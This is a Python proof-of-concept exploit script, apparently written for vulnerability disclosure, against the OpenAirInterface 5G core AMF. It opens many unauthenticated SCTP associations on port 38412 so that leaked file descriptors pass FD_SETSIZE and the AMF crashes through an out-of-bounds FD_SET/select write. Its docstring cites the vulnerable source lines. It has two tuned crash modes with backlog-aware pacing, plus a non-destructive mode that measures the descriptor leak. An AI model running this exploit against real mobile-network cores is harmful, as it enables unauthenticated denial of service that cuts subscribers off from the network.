#!/usr/bin/env python3
"""
OAI CN5G AMF -- unauthenticated SCTP fd exhaustion driving an out-of-bounds
FD_SET()/select() write on the N2 receiver thread stack.

This single script carries BOTH halves of the argument, selected by --mode:

  * sequential / hold  -- the destructive crash PoC (the impact): drive the
    accepted fd number past FD_SETSIZE(1024) and make the AMF abort.
  * measure            -- the non-destructive proof of the CWE-775 descriptor
    leak that is the *enabler*: show that every association the AMF accepts
    permanently consumes one descriptor (it never close()s an accepted socket)
    while leaving the AMF alive to be sampled.

The two modes are mutually exclusive at runtime, not just logically: `measure`
needs the AMF alive to keep sampling /proc/<pid>/fd through an idle settle
window, whereas the crash modes deliberately kill it. Run `measure` first on a
healthy AMF, then restart the stack and run a crash mode.

Vulnerable code (oai-cn5g-amf, develop 5fda86e8215eb1686caab729f2161ecd0abd006f):

  src/sctp/sctp_server.cpp:160  void* sctp_server::sctp_receiver_thread(void* arg)
  src/sctp/sctp_server.cpp:165    fd_set master;            // 128-byte stack local
  src/sctp/sctp_server.cpp:166    fd_set read_fds;          // 128-byte stack local
  src/sctp/sctp_server.cpp:177    select(fdmax + 1, &read_fds, NULL, NULL, NULL)
  src/sctp/sctp_server.cpp:192    FD_SET(clientsock, &master);   // <-- NO FD_SETSIZE CHECK
  src/sctp/sctp_server.cpp:193    if (clientsock > fdmax) fdmax = clientsock;

No `FD_SETSIZE` bound exists anywhere in the AMF tree, and accepted client
sockets are never close()d -- the only close() in the file, :61, is on the
listening socket. remove_association() (:422) free()s the context struct but
leaves the descriptor open. Every SCTP association a peer establishes -- and
then tears down -- therefore permanently consumes one AMF file descriptor, and
the fd number handed to accept() climbs monotonically.

Once the accepted fd reaches FD_SETSIZE (1024) the write leaves the fd_set
object:

  * FD_SET(fd, &master) with fd >= 1024 targets fds_bits[fd/64], i.e. memory
    past the end of the 128-byte stack local -> out-of-bounds write (CWE-787).
  * select(fdmax+1, &read_fds, ...) with fdmax >= 1024 makes the kernel write
    back ceil((fdmax+1)/8) bytes into the 128-byte `read_fds` stack local.

Note on the observed failure mode (verified by binary inspection, not assumed):
`readelf -sW` on /openair-amf/bin/oai_amf shows __fdelt_chk among the imported
symbols, i.e. this build has _FORTIFY_SOURCE-enabled FD_SET/FD_CLR/FD_ISSET.
__fdelt_chk() calls __chk_fail() for d < 0 || d >= FD_SETSIZE, so the
out-of-bounds write is caught and the process aborts with
"*** buffer overflow detected ***: terminated" (SIGSEGV/SIGABRT).
The demonstrated impact is therefore an unauthenticated remote denial of
service of the AMF, not memory corruption or code execution. On a build
without _FORTIFY_SOURCE the same code path is a silent stack overflow.

No NGAP payload is required: bare SCTP associations are enough. The attack is
fully unauthenticated and reachable from anything that can open SCTP/38412.

Usage:
  # destructive crash PoC
  ./poc_amf_sctp_fdset.py --target 172.30.0.9 --port 38412
  ./poc_amf_sctp_fdset.py --target 172.30.0.9 --mode sequential --count 3000
  ./poc_amf_sctp_fdset.py --target 172.30.0.9 --mode hold --count 1200

  # non-destructive fd-leak measurement (AMF stays alive)
  ./poc_amf_sctp_fdset.py --target 172.30.0.6 --mode measure --count 50 --settle 60
"""

import argparse
import json
import os
import socket
import subprocess
import sys
import time

try:
    import resource

    def raise_fd_limit(want=65536):
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        target = min(want, hard) if hard != resource.RLIM_INFINITY else want
        if soft < target:
            resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
        return resource.getrlimit(resource.RLIMIT_NOFILE)[0]
except ImportError:  # pragma: no cover
    def raise_fd_limit(want=65536):
        return -1


SCTP = 132  # IPPROTO_SCTP


def log(msg):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), msg), flush=True)


def one_association(target, port, timeout):
    """Open a single one-to-one SCTP association (SOCK_STREAM/IPPROTO_SCTP)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, SCTP)
    s.settimeout(timeout)
    s.connect((target, port))
    return s


def amf_fds(container="oai-amf"):
    """Descriptor count of the AMF's PID 1, read from the host (zero load).
    A `docker exec` poll would fork inside the container and measurably slow
    the very accept() loop we are studying."""
    try:
        pid = subprocess.check_output(
            ["docker", "inspect", "-f", "{{.State.Pid}}", container],
            stderr=subprocess.DEVNULL).decode().strip()
        if not pid or pid == "0":
            return -1
        return len(os.listdir("/proc/%s/fd" % pid))
    except Exception:
        return -1


def amf_state(container="oai-amf"):
    try:
        return subprocess.check_output(
            ["docker", "inspect", "-f",
             "{{.State.Status}} exit={{.State.ExitCode}}", container],
            stderr=subprocess.DEVNULL).decode().strip()
    except Exception:
        return "unknown"


def mode_sequential(target, port, count, timeout, delay, stop_check,
                    deadline=600.0, max_consec_fail=40):
    """
    connect + immediate close, repeated. Because the AMF never close()s the
    accepted fd, each cycle still burns one descriptor on the server side.
    This is the cheapest vector: one short-lived association at a time.

    Pacing matters: the AMF calls listen(socket_, 5) (sctp_server.cpp:143), so
    its accept backlog holds only 5 associations. A naive loop overruns it and
    the kernel answers ECONNREFUSED. Back off multiplicatively on refusal and
    recover slowly on success -- this sustains ~880 associations/s in practice.
    """
    ok = 0
    refused = 0
    timeouts = 0
    consec = 0
    backoff = delay if delay > 0 else 0.002
    t0 = time.time()
    while ok < count and (time.time() - t0) < deadline:
        try:
            s = one_association(target, port, timeout)
            s.close()
            ok += 1
            backoff = max(delay if delay > 0 else 0.0005, backoff * 0.98)
        except ConnectionRefusedError:
            # backlog full -- the server is alive but busy accepting
            refused += 1
            backoff = min(0.25, backoff * 1.6)
            time.sleep(backoff)
            continue
        except (socket.timeout, TimeoutError):
            # the AMF's accept loop fell behind (its select() scan is O(fdmax)
            # and every association generates debug logs + ITTI work), so the
            # kernel dropped our INIT. The server is still alive -- retry.
            refused += 1
            timeouts += 1
            consec += 1
            backoff = min(1.0, backoff * 2.0)
            if consec >= max_consec_fail:
                log("%d consecutive timeouts at ok=%d -- treating the AMF as "
                    "unresponsive (this is itself a DoS symptom)" % (consec, ok))
                break
            time.sleep(backoff)
            continue
        except OSError as e:
            log("cycle %d failed hard: %r (server may be gone)" % (ok, e))
            break
        consec = 0
        if stop_check and stop_check(ok):
            log("stop_check signalled at cycle %d" % ok)
            break
        if backoff:
            time.sleep(backoff)
        if ok and ok % 100 == 0:
            log("  %d/%d accepted  (%.1f/s, %d refused-retries)"
                % (ok, count, ok / max(time.time() - t0, 1e-9), refused))
    log("  total refused-retries: %d (timeouts %d)" % (refused, timeouts))
    return ok


def mode_hold(target, port, count, timeout, stop_check, delay=0.0,
              deadline=900.0, max_consec_fail=40):
    """
    Hold every association open simultaneously. Same descriptor growth, but the
    associations stay established, which is what a real rogue-gNB fleet looks
    like. Keeps the sockets in a list so they are not garbage collected.

    This is also the *faster* vector: a connect+close cycle makes the AMF handle
    both an SCTP_ASSOC_CHANGE and an SCTP_SHUTDOWN notification plus a gNB
    removal, whereas a held association only costs the initial ASSOC_CHANGE. The
    receiver thread therefore keeps calling accept() at a much higher rate.
    """
    held = []
    refused = 0
    consec = 0
    backoff = delay if delay > 0 else 0.002
    t0 = time.time()
    while len(held) < count and (time.time() - t0) < deadline:
        try:
            held.append(one_association(target, port, timeout))
            backoff = max(delay if delay > 0 else 0.0005, backoff * 0.98)
            consec = 0
        except ConnectionRefusedError:
            refused += 1
            consec += 1
            backoff = min(1.0, backoff * 1.6)
            time.sleep(backoff)
            continue
        except (socket.timeout, TimeoutError):
            refused += 1
            consec += 1
            backoff = min(1.0, backoff * 2.0)
            if consec >= max_consec_fail:
                log("%d consecutive timeouts at %d held -- AMF unresponsive "
                    "(itself a DoS symptom)" % (consec, len(held)))
                break
            time.sleep(backoff)
            continue
        except OSError as e:
            log("association %d failed hard: %r (server may be gone)"
                % (len(held), e))
            break
        n = len(held)
        if backoff:
            time.sleep(backoff)
        if n and n % 100 == 0:
            log("  %d/%d held  (%.1f/s, %d retries)"
                % (n, count, n / max(time.time() - t0, 1e-9), refused))
    log("holding %d associations open (%d retries)" % (len(held), refused))
    return held


def mode_measure(target, port, count, timeout, settle, container, out):
    """
    Non-destructive proof of the CWE-775 descriptor leak that makes the
    FD_SETSIZE crossing reachable. The point here is *not* the crash (see the
    sequential/hold modes for that) but the enabler: sctp_server::remove_
    association() (sctp_server.cpp:422) free()s the association context and
    erases it from sctp_ctx_, but never close()s the descriptor returned by
    accept() at sctp_server.cpp:186. The only close() in src/sctp/ is
    sctp_server.cpp:61, on the *listening* socket.

    Consequence: an attacker holding only ONE socket open at a time still
    permanently consumes one AMF descriptor per association. The AMF's own
    RLIMIT_NOFILE (1048576 in the reference deployment) is the only ceiling and
    it sits far above FD_SETSIZE(1024), so nothing stops the fd number from
    reaching the out-of-bounds region. The AMF is left ALIVE so the growth can
    be sampled across an idle settle window and shown to be permanent.
    """
    r = {"target": "%s:%d" % (target, port), "mode": "measure",
         "count": count, "settle_s": settle, "timeline": []}

    base = amf_fds(container)
    r["amf_fds_baseline"] = base
    r["amf_state_baseline"] = amf_state(container)
    log("AMF baseline: fds=%d  state=%s" % (base, r["amf_state_baseline"]))

    # --- phase 1: a single association, then disconnect -------------------
    log("phase 1: open ONE association, close it, and watch the AMF fd count")
    s = one_association(target, port, timeout)
    time.sleep(2)  # let the AMF's receiver thread get round to accept()
    during = amf_fds(container)
    t_close = time.time()
    s.close()
    log("  during association : fds=%d (delta %+d)" % (during, during - base))
    after = during
    for mark in (5, 15, 30, 60):
        while time.time() - t_close < mark:
            time.sleep(0.5)
        after = amf_fds(container)
        log("  %3d s after close    : fds=%d (delta %+d)"
            % (int(time.time() - t_close), after, after - base))
        r["timeline"].append({"phase": "single", "t_s": mark, "fds": after})
    r["amf_fds_after_single_close"] = after
    r["single_leak_delta"] = after - base

    # --- phase 2: N sequential connect+close, one socket at a time --------
    log("phase 2: %d sequential connect+close cycles (only 1 client socket "
        "open at any instant)" % count)
    ok = 0
    t0 = time.time()
    backoff = 0.002
    while ok < count:
        try:
            c = one_association(target, port, timeout)
            c.close()
            ok += 1
            backoff = max(0.0005, backoff * 0.98)
        except (ConnectionRefusedError, socket.timeout, TimeoutError):
            backoff = min(1.0, backoff * 1.8)
            time.sleep(backoff)
            continue
        except OSError as e:
            log("  aborted at cycle %d: %r" % (ok, e))
            break
        if backoff:
            time.sleep(backoff)
        if ok and ok % 10 == 0:
            f = amf_fds(container)
            log("  %3d/%d cycles  AMF fds=%d (delta %+d)  %.1f/s"
                % (ok, count, f, f - base, ok / max(time.time() - t0, 1e-9)))
            r["timeline"].append({"phase": "sequential", "cycles": ok, "fds": f})
    r["cycles_completed"] = ok
    r["amf_fds_after_sequential"] = amf_fds(container)
    log("  after %d cycles: AMF fds=%d (delta %+d)"
        % (ok, r["amf_fds_after_sequential"],
           r["amf_fds_after_sequential"] - base))

    # --- phase 3: settle, to prove nothing is reclaimed -------------------
    log("phase 3: idle for %.0f s (longer than any SCTP/NGAP timer) and "
        "re-sample" % settle)
    for i in range(int(settle / 15)):
        time.sleep(15)
        f = amf_fds(container)
        log("  +%3d s idle: AMF fds=%d (delta %+d)  state=%s"
            % ((i + 1) * 15, f, f - base, amf_state(container)))
        r["timeline"].append({"phase": "settle", "t_s": (i + 1) * 15, "fds": f})
    r["amf_fds_after_settle"] = amf_fds(container)
    r["amf_state_final"] = amf_state(container)

    leaked = r["amf_fds_after_settle"] - base
    r["permanent_leak_delta"] = leaked
    r["fds_per_association"] = round(leaked / max(ok, 1), 3)
    r["verdict"] = (
        "LEAK CONFIRMED: %d descriptors still held after %d closed "
        "associations and %.0f s idle (%.3f fd per association); the AMF "
        "never close()s an accepted socket"
        % (leaked, ok, settle, leaked / max(ok, 1))
        if leaked >= ok * 0.8 else
        "leak NOT confirmed: only %+d descriptors retained for %d closed "
        "associations" % (leaked, ok))
    log("VERDICT: " + r["verdict"])

    if out:
        with open(out, "w") as fh:
            json.dump(r, fh, indent=2)
        log("wrote %s" % out)
    else:
        print(json.dumps(r, indent=2))
    return 0


def main():
    ap = argparse.ArgumentParser(
        description="OAI CN5G AMF SCTP FD_SETSIZE out-of-bounds write PoC "
                    "(crash modes) + CWE-775 fd-leak measurement (measure mode)")
    ap.add_argument("--target", required=True, help="AMF N2 address (IPv4)")
    ap.add_argument("--port", type=int, default=38412, help="AMF N2 SCTP port")
    ap.add_argument("--mode", choices=["sequential", "hold", "measure"],
                    default="sequential",
                    help="sequential = connect+close loop (cheapest crash PoC); "
                         "hold = keep all associations open (crash PoC); "
                         "measure = non-destructive fd-leak proof (AMF stays alive)")
    ap.add_argument("--count", type=int, default=None,
                    help="associations to create (default 3000 for crash modes, "
                         "50 for measure)")
    ap.add_argument("--timeout", type=float, default=8.0, help="connect timeout s")
    ap.add_argument("--delay", type=float, default=0.0,
                    help="sleep between cycles (sequential mode)")
    ap.add_argument("--hold-seconds", type=float, default=0.0,
                    help="after the loop, keep sockets open this long (hold mode)")
    ap.add_argument("--deadline", type=float, default=900.0,
                    help="give up after this many seconds (default 900)")
    ap.add_argument("--max-consec-fail", type=int, default=40,
                    help="consecutive refused/timeout connects tolerated before "
                         "declaring the AMF unresponsive (default 40)")
    # measure-mode only
    ap.add_argument("--settle", type=float, default=60.0,
                    help="measure mode: idle seconds afterwards, to prove the "
                         "fd growth is permanent and not an in-flight association")
    ap.add_argument("--container", default="oai-amf",
                    help="measure mode: AMF container name for /proc fd sampling")
    ap.add_argument("--out", default=None,
                    help="measure mode: write the JSON summary here")
    args = ap.parse_args()

    if args.count is None:
        args.count = 50 if args.mode == "measure" else 3000

    # non-destructive fd-leak measurement; leaves the AMF alive.
    if args.mode == "measure":
        return mode_measure(args.target, args.port, args.count, args.timeout,
                            args.settle, args.container, args.out)

    lim = raise_fd_limit(65536)
    log("target %s:%d  mode=%s count=%d  attacker RLIMIT_NOFILE=%s"
        % (args.target, args.port, args.mode, args.count, lim))
    log("timeout=%.0fs deadline=%.0fs max_consec_fail=%d"
        % (args.timeout, args.deadline, args.max_consec_fail))
    log("FD_SETSIZE boundary is 1024; the AMF baseline fd count is ~9, so "
        "~1015 associations cross it")

    t0 = time.time()
    if args.mode == "sequential":
        n = mode_sequential(args.target, args.port, args.count,
                            args.timeout, args.delay, None,
                            deadline=args.deadline,
                            max_consec_fail=args.max_consec_fail)
    else:
        held = mode_hold(args.target, args.port, args.count, args.timeout,
                         None, delay=args.delay, deadline=args.deadline,
                         max_consec_fail=args.max_consec_fail)
        n = len(held)
        if args.hold_seconds:
            log("sleeping %.1f s with associations held" % args.hold_seconds)
            time.sleep(args.hold_seconds)

    dt = time.time() - t0
    log("DONE: %d associations in %.1f s (%.1f/s)" % (n, dt, n / max(dt, 1e-9)))
    if n < 1015:
        log("WARNING: fewer than ~1015 associations completed; the fd number "
            "may not have reached FD_SETSIZE(1024) -- check whether the AMF "
            "died early (that is also a positive result)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
